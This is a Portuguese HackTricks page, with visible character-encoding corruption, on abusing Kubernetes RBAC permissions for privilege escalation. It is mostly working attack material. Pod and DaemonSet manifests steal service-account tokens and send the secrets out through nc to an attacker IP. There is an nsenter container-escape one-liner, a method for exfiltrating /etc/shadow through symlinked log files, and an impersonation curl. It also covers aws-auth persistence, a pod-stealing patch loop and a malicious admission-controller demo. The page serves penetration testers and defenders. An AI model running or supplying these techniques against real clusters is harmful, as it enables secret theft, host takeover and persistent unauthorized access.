# Abusando de Fun√ß√µes/ClusterRoles no Kubernetes

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Aqui voc√™ pode encontrar algumas configura√ß√µes de Fun√ß√µes e ClusterRoles potencialmente perigosas.\
Lembre-se de que voc√™ pode obter todos os recursos suportados com `kubectl api-resources`

## **Escala√ß√£o de Privil√©gios**

Referindo-se como a arte de obter **acesso a um principal diferente** dentro do cluster **com privil√©gios diferentes** (dentro do cluster Kubernetes ou para nuvens externas) do que os que voc√™ j√° possui, no Kubernetes existem basicamente **4 t√©cnicas principais para escalar privil√©gios**:

* Ser capaz de **fazer-se passar por** outros usu√°rios/grupos/SAs com melhores privil√©gios dentro do cluster Kubernetes ou para nuvens externas
* Ser capaz de **criar/alterar/executar pods** onde voc√™ pode **encontrar ou anexar SAs** com melhores privil√©gios dentro do cluster Kubernetes ou para nuvens externas
* Ser capaz de **ler segredos** pois os tokens dos SAs s√£o armazenados como segredos
* Ser capaz de **escapar para o n√≥** de um cont√™iner, onde voc√™ pode roubar todos os segredos dos cont√™ineres em execu√ß√£o no n√≥, as credenciais do n√≥ e as permiss√µes do n√≥ dentro da nuvem em que est√° sendo executado (se houver)
* Uma quinta t√©cnica que merece men√ß√£o √© a capacidade de **executar port-forward** em um pod, pois voc√™ pode ser capaz de acessar recursos interessantes dentro desse pod.

### Acessar Qualquer Recurso ou Verbo (Coringa)

O **coringa (\*) d√° permiss√£o sobre qualquer recurso com qualquer verbo**. √â usado por administradores. Dentro de um ClusterRole, isso significa que um atacante poderia abusar de qualquer namespace no cluster
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Acessar Qualquer Recurso com um verbo espec√≠fico

No RBAC, certas permiss√µes representam riscos significativos:

1. **`create`:** Concede a capacidade de criar qualquer recurso do cluster, arriscando escalonamento de privil√©gios.
2. **`list`:** Permite listar todos os recursos, potencialmente vazando dados sens√≠veis.
3. **`get`:** Permite acessar segredos de contas de servi√ßo, representando uma amea√ßa √† seguran√ßa.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Criar Pod - Roubar Token

Um atacante com permiss√µes para criar um pod, poderia anexar uma Conta de Servi√ßo privilegiada ao pod e roubar o token para se passar pela Conta de Servi√ßo. Efetivamente escalando privil√©gios para ela.

Exemplo de um pod que ir√° roubar o token da conta de servi√ßo `bootstrap-signer` e envi√°-lo para o atacante:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Cria√ß√£o e Escape de Pods

O seguinte indica todos os privil√©gios que um cont√™iner pode ter:

- **Acesso privilegiado** (desabilitando prote√ß√µes e definindo capacidades)
- **Desativar os namespaces hostIPC e hostPid** que podem ajudar a escalar privil√©gios
- **Desativar o namespace hostNetwork**, dando acesso para roubar privil√©gios da nuvem dos n√≥s e melhor acesso √†s redes
- **Montar o / do host dentro do cont√™iner**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Crie o pod com:
```bash
kubectl --token $token create -f mount_root.yaml
```
Uma linha de [este tweet](https://twitter.com/mauilion/status/1129468485480751104) e com algumas adi√ß√µes:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Agora que voc√™ pode escapar para o n√≥, verifique as t√©cnicas p√≥s-explora√ß√£o em:

#### Furtividade

Provavelmente voc√™ deseja ser **mais furtivo**, nas pr√≥ximas p√°ginas voc√™ pode ver o que seria capaz de acessar se criar um pod habilitando apenas alguns dos privil√©gios mencionados no modelo anterior:

* **Privileged + hostPID**
* **Apenas privilegiado**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Voc√™ pode encontrar exemplos de como criar/abusar das configura√ß√µes de pods privilegiados anteriores em_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Criar Pod - Mover para a nuvem

Se voc√™ pode **criar** um **pod** (e opcionalmente uma **conta de servi√ßo**), talvez consiga **obter privil√©gios no ambiente de nuvem** ao **atribuir fun√ß√µes de nuvem a um pod ou a uma conta de servi√ßo** e depois acess√°-lo.\
Al√©m disso, se voc√™ puder criar um **pod com o namespace de rede do host**, poder√° **roubar a fun√ß√£o IAM** da inst√¢ncia do **n√≥**.

Para mais informa√ß√µes, consulte:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Criar/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs e Cronjobs**

√â poss√≠vel abusar dessas permiss√µes para **criar um novo pod** e estabelecer privil√©gios como no exemplo anterior.

O yaml a seguir **cria um daemonset e exfiltra o token do SA** dentro do pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Execu√ß√£o de Pods**

**`pods/exec`** √© um recurso no Kubernetes usado para **executar comandos em um shell dentro de um pod**. Isso permite **executar comandos dentro dos cont√™ineres ou obter um shell interno**.

Portanto, √© poss√≠vel **entrar em um pod e roubar o token do SA**, ou entrar em um pod privilegiado, escapar para o n√≥ e roubar todos os tokens dos pods no n√≥ e (abusar) do n√≥:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Esta permiss√£o permite **encaminhar uma porta local para uma porta no pod especificado**. Isso √© destinado a facilitar a depura√ß√£o de aplicativos em execu√ß√£o dentro de um pod, mas um atacante pode abusar disso para obter acesso a aplicativos interessantes (como bancos de dados) ou vulner√°veis (sites?) dentro de um pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Escape de /var/log/ com Permiss√£o de Escrita nos Hosts

Conforme [**indicado nesta pesquisa**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), se voc√™ puder acessar ou criar um pod com o **diret√≥rio `/var/log/` dos hosts montado** nele, voc√™ pode **escapar do cont√™iner**.\
Isso ocorre basicamente porque quando o **Kube-API tenta obter os logs** de um cont√™iner (usando `kubectl logs <pod>`), ele **solicita o arquivo `0.log`** do pod usando o endpoint `/logs/` do servi√ßo **Kubelet**.\
O servi√ßo Kubelet exp√µe o endpoint `/logs/` que basicamente est√° **expondo o sistema de arquivos `/var/log` do cont√™iner**.

Portanto, um atacante com **acesso para escrever na pasta /var/log/** do cont√™iner poderia abusar desses comportamentos de 2 maneiras:

* Modificando o arquivo `0.log` de seu cont√™iner (geralmente localizado em `/var/logs/pods/namespace_pod_uid/container/0.log`) para ser um **link simb√≥lico apontando para `/etc/shadow`**, por exemplo. Em seguida, voc√™ poder√° exfiltrar o arquivo shadow dos hosts fazendo:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Se o atacante controlar qualquer principal com as **permiss√µes para ler `nodes/log`**, ele pode simplesmente criar um **symlink** em `/host-mounted/var/log/sym` para `/` e quando **acessar `https://<gateway>:10250/logs/sym/` ele listar√° o sistema de arquivos raiz dos hosts** (alterar o symlink pode fornecer acesso a arquivos).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Um laborat√≥rio e um exploit automatizado podem ser encontrados em** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Bypassing prote√ß√£o readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Se voc√™ tiver sorte e a capacidade altamente privilegiada `CAP_SYS_ADMIN` estiver dispon√≠vel, voc√™ pode simplesmente remontar a pasta como rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Conforme declarado nesta [**pesquisa**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), √© poss√≠vel contornar a prote√ß√£o:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
O que foi feito para evitar escapes como os anteriores foi, em vez de usar uma montagem hostPath, usar um PersistentVolume e um PersistentVolumeClaim para montar uma pasta do host no cont√™iner com acesso de grava√ß√£o:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonando contas privilegiadas**

Com um privil√©gio de [**impersona√ß√£o de usu√°rio**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), um atacante poderia se passar por uma conta privilegiada.

Basta usar o par√¢metro `--as=<username>` no comando `kubectl` para se passar por um usu√°rio, ou `--as-group=<group>` para se passar por um grupo:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ou utilize a REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listagem de Segredos

A permiss√£o para **listar segredos poderia permitir que um atacante realmente leia os segredos** acessando o endpoint da API REST:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lendo um segredo - for√ßando IDs de token

Enquanto um atacante em posse de um token com permiss√µes de leitura requer o nome exato do segredo para us√°-lo, ao contr√°rio do privil√©gio mais amplo de _**listar segredos**_, ainda existem vulnerabilidades. As contas de servi√ßo padr√£o no sistema podem ser enumeradas, cada uma associada a um segredo. Esses segredos t√™m uma estrutura de nome: um prefixo est√°tico seguido de um token alfanum√©rico aleat√≥rio de cinco caracteres (excluindo certos caracteres) de acordo com o [c√≥digo-fonte](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

O token √© gerado a partir de um conjunto limitado de 27 caracteres (`bcdfghjklmnpqrstvwxz2456789`), em vez do intervalo alfanum√©rico completo. Essa limita√ß√£o reduz o total de combina√ß√µes poss√≠veis para 14.348.907 (27^5). Consequentemente, um atacante poderia executar um ataque de for√ßa bruta para deduzir o token em quest√£o de horas, potencialmente levando a uma escalada de privil√©gios ao acessar contas de servi√ßo sens√≠veis.

### Solicita√ß√µes de Assinatura de Certificado

Se voc√™ tiver os verbos **`create`** no recurso `certificatesigningrequests` (ou pelo menos em `certificatesigningrequests/nodeClient`). Voc√™ pode **criar** um novo CeSR de um **novo n√≥**.

De acordo com a [documenta√ß√£o, √© poss√≠vel aprovar automaticamente essas solicita√ß√µes](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), ent√£o, nesse caso, voc√™ **n√£o precisa de permiss√µes extras**. Caso contr√°rio, voc√™ precisaria ser capaz de aprovar a solicita√ß√£o, o que significa atualizar em `certificatesigningrequests/approval` e `approve` em `signers` com o nome do recurso `<signerNameDomain>/<signerNamePath>` ou `<signerNameDomain>/*`

Um **exemplo de uma fun√ß√£o** com todas as permiss√µes necess√°rias √©:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Portanto, com a aprova√ß√£o do CSR do novo n√≥, voc√™ pode **abusar** das permiss√µes especiais dos n√≥s para **roubar segredos** e **escalar privil√©gios**.

Nos [**este post**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) e [**este outro**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), a configura√ß√£o de inicializa√ß√£o do TLS do GKE K8s √© configurada com **assinatura autom√°tica** e √© abusada para gerar credenciais de um novo N√≥ K8s e ent√£o abusar deles para escalar privil√©gios roubando segredos.\
Se voc√™ **tiver os privil√©gios mencionados, voc√™ poderia fazer a mesma coisa**. Note que o primeiro exemplo contorna o erro que impede um novo n√≥ de acessar segredos dentro de cont√™ineres porque um **n√≥ s√≥ pode acessar os segredos dos cont√™ineres montados nele**.

A maneira de contornar isso √© apenas **criar credenciais de n√≥ para o nome do n√≥ onde o cont√™iner com os segredos interessantes est√° montado** (mas apenas verifique como fazer isso no primeiro post):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### Configmaps aws-auth do AWS EKS

Principais que podem modificar **`configmaps`** no namespace kube-system em clusters EKS (precisam estar na AWS) podem obter privil√©gios de administrador do cluster sobrescrevendo o configmap **aws-auth**.\
Os verbos necess√°rios s√£o **`update`** e **`patch`**, ou **`create`** se o configmap n√£o foi criado:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Voc√™ pode usar **`aws-auth`** para **persist√™ncia** dando acesso a usu√°rios de **outras contas**.

No entanto, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **n√£o funciona de uma conta diferente**. Mas na verdade `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` funciona se voc√™ colocar o ARN do cluster em vez de apenas o nome.\
Para fazer o `kubectl` funcionar, certifique-se de **configurar** o **kubeconfig da v√≠tima** e nos argumentos de execu√ß√£o da aws adicione `--profile other_account_role` para que o kubectl use o perfil da outra conta para obter o token e entrar em contato com a AWS.
{% endhint %}

### Escalando no GKE

Existem **2 maneiras de atribuir permiss√µes K8s a princ√≠pios do GCP**. Em qualquer caso, o princ√≠pio tamb√©m precisa da permiss√£o **`container.clusters.get`** para poder obter credenciais para acessar o cluster, ou voc√™ precisar√° **gerar seu pr√≥prio arquivo de configura√ß√£o do kubectl** (siga o pr√≥ximo link).

{% hint style="warning" %}
Ao falar com o endpoint da API do K8s, o **token de autentica√ß√£o do GCP ser√° enviado**. Em seguida, o GCP, por meio do endpoint da API do K8s, primeiro **verificar√° se o princ√≠pio** (por e-mail) **tem algum acesso dentro do cluster**, e ent√£o verificar√° se ele tem **qualquer acesso via GCP IAM**.\
Se **qualquer um** desses for **verdadeiro**, ele ser√° **respondido**. Se **n√£o**, um **erro** sugerindo dar **permiss√µes via GCP IAM** ser√° dado.
{% endhint %}

Ent√£o, o primeiro m√©todo √© usando **GCP IAM**, as permiss√µes do K8s t√™m suas **equivalentes permiss√µes do GCP IAM**, e se o princ√≠pio tiver, ele poder√° us√°-las.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

O segundo m√©todo √© **atribuir permiss√µes K8s dentro do cluster** identificando o usu√°rio pelo seu **e-mail** (inclu√≠das as contas de servi√ßo do GCP).

### Criar token de serviceaccounts

Princ√≠pios que podem **criar TokenRequests** (`serviceaccounts/token`) Ao falar com o endpoint da API do K8s SAs (informa√ß√µes de [**aqui**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Princ√≠pios que podem **`atualizar`** ou **`patch`** **`pods/ephemeralcontainers`** podem obter **execu√ß√£o de c√≥digo em outros pods**, e potencialmente **escapar** para seu n√≥ adicionando um cont√™iner ef√™mero com um securityContext privilegiado.

### ValidatingWebhookConfigurations ou MutatingWebhookConfigurations

Princ√≠pios com qualquer um dos verbos `create`, `update` ou `patch` sobre `validatingwebhookconfigurations` ou `mutatingwebhookconfigurations` podem ser capazes de **criar uma dessas webhookconfigurations** para poder **escalar privil√©gios**.

Para um exemplo de [`mutatingwebhookconfigurations` confira esta se√ß√£o deste post](./#malicious-admission-controller).

### Escalar

Como voc√™ pode ler na pr√≥xima se√ß√£o: [**Preven√ß√£o de Escala√ß√£o de Privil√©gios Incorporada**](./#built-in-privileged-escalation-prevention), um princ√≠pio n√£o pode atualizar nem criar fun√ß√µes ou clusterroles sem ter essas novas permiss√µes. Exceto se ele tiver o **verbo `escalate`** sobre **`roles`** ou **`clusterroles`.**\
Ent√£o ele pode atualizar/criar novas fun√ß√µes, clusterroles com melhores permiss√µes do que as que ele tem.

### Proxy de n√≥s

Princ√≠pios com acesso ao sub-recurso **`nodes/proxy`** podem **executar c√≥digo em pods** via a API do Kubelet (de acordo com [**isto**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Mais informa√ß√µes sobre autentica√ß√£o do Kubelet nesta p√°gina:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Voc√™ tem um exemplo de como obter [**RCE falando autorizado a uma API do Kubelet aqui**](../pentesting-kubernetes-services/#kubelet-rce).

### Excluir pods + n√≥s n√£o escalon√°veis

Princ√≠pios que podem **excluir pods** (verbo `delete` sobre o recurso `pods`), ou **expulsar pods** (verbo `create` sobre o recurso `pods/eviction`), ou **alterar o status do pod** (acesso a `pods/status`) e podem **tornar outros n√≥s n√£o escalon√°veis** (acesso a `nodes/status`) ou **excluir n√≥s** (verbo `delete` sobre o recurso `nodes`) e t√™m controle sobre um pod, poderiam **roubar pods de outros n√≥s** para que sejam **executados** no **n√≥ comprometido** e o atacante possa **roubar os tokens** desses pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status dos Servi√ßos (CVE-2020-8554)

Principais que podem **modificar** **`services/status`** podem definir o campo `status.loadBalancer.ingress.ip` para explorar a **CVE-2020-8554 n√£o corrigida** e lan√ßar **ataques de MiTM contra o clus**ter. A maioria das mitigacÃßoÃÉes para a CVE-2020-8554 apenas previnem servicÃßos ExternalIP (de acordo com [**este**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status dos N√≥s e Pods

Principais com permiss√µes de **`update`** ou **`patch`** sobre `nodes/status` ou `pods/status`, poderiam modificar r√≥tulos para afetar as restri√ß√µes de agendamento impostas.

## Preven√ß√£o de EscalacÃßaÃÉo de Privil√©gios Incorporada

O Kubernetes possui um [mecanismo incorporado](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) para prevenir a escalacÃßaÃÉo de privil√©gios.

Esse sistema garante que **os usuaÃÅrios naÃÉo podem elevar seus privil√©gios modificando fun√ß√µes ou associa√ß√µes de fun√ß√µes**. A aplica√ß√£o dessa regra ocorre no niÃÅvel da API, fornecendo uma protecÃßaÃÉo mesmo quando o autorizador RBAC est√° inativo.

A regra estipula que um **usuaÃÅrio soÃÅ pode criar ou atualizar uma fun√ß√£o se possuir todas as permiss√µes que a fun√ß√£o compreende**. AleÃÅm disso, o escopo das permiss√µes existentes do usuaÃÅrio deve estar alinhado com o da fun√ß√£o que ele est√° tentando criar ou modificar: seja em todo o cluster para ClusterRoles ou restrito ao mesmo namespace (ou em todo o cluster) para Roles.

{% hint style="warning" %}
Existe uma excecÃßaÃÉo aÃÄ regra anterior. Se um principal tem o **verbo `escalate`** sobre **`roles`** ou **`clusterroles`** ele pode aumentar os privil√©gios de fun√ß√µes e clusterroles mesmo sem possuir as permiss√µes ele mesmo.
{% endhint %}

### **Obter e Modificar RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Aparentemente essa t√©cnica funcionava antes, mas de acordo com meus testes, n√£o est√° mais funcionando pelo mesmo motivo explicado na se√ß√£o anterior. Voc√™ n√£o pode criar/modificar um rolebinding para conceder a si mesmo ou a um SA diferente alguns privil√©gios se voc√™ ainda n√£o os tiver.**
{% endhint %}

O privil√©gio de criar Rolebindings permite a um usuaÃÅrio **associar fun√ß√µes a uma conta de servi√ßo**. Esse privil√©gio pode potencialmente levar a uma escalacÃßaÃÉo de privil√©gios porque **permite ao usuaÃÅrio associar privil√©gios de administrador a uma conta de servi√ßo comprometida.**

## Outros Ataques

### Aplicativo de Proxy Sidecar

Por padr√£o, n√£o h√° nenhuma criptografia na comunica√ß√£o entre pods. Autentica√ß√£o m√∫tua, de duas vias, pod a pod.

#### Criar um aplicativo de proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Crie seu .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Edite seu arquivo .yaml e adicione as linhas descomentadas:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Veja os logs do proxy:
```bash
kubectl logs app -C proxy
```
Mais informa√ß√µes em: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Controlador de Admiss√£o Malicioso

Um controlador de admiss√£o **intercepta solicita√ß√µes ao servidor da API do Kubernetes** antes da persist√™ncia do objeto, mas **ap√≥s a solicita√ß√£o ser autenticada** **e autorizada**.

Se um atacante de alguma forma conseguir **injetar um Controlador de Admiss√£o de Muta√ß√£o**, ele ser√° capaz de **modificar solicita√ß√µes j√° autenticadas**. Sendo capaz de potencialmente elevar privil√©gios e, mais comumente, persistir no cluster.

**Exemplo de** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Verifique o status para ver se est√° pronto:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Em seguida, implante um novo pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Quando voc√™ vir o erro `ErrImagePull`, verifique o nome da imagem com qualquer uma das consultas:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Como pode ver na imagem acima, tentamos executar a imagem `nginx`, mas a imagem executada final foi `rewanthtammana/malicious-image`. O que acabou de acontecer!!?

#### Aspectos T√©cnicos <a href="#heading-technicalities" id="heading-technicalities"></a>

O script `./deploy.sh` estabelece um controlador de admiss√£o de webhook de muta√ß√£o, que modifica solicita√ß√µes para a API do Kubernetes conforme especificado em suas linhas de configura√ß√£o, influenciando os resultados observados:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
O trecho acima substitui a primeira imagem do container em todos os pods por `rewanthtammana/malicious-image`.

## Melhores Pr√°ticas

### **Desativar a Montagem Autom√°tica de Tokens de Conta de Servi√ßo**

* **Pods e Contas de Servi√ßo**: Por padr√£o, os pods montam um token de conta de servi√ßo. Para aumentar a seguran√ßa, o Kubernetes permite desativar esse recurso de montagem autom√°tica.
* **Como Aplicar**: Defina `automountServiceAccountToken: false` na configura√ß√£o de contas de servi√ßo ou pods a partir da vers√£o 1.6 do Kubernetes.

### **Atribui√ß√£o Restritiva de Usu√°rio em RoleBindings/ClusterRoleBindings**

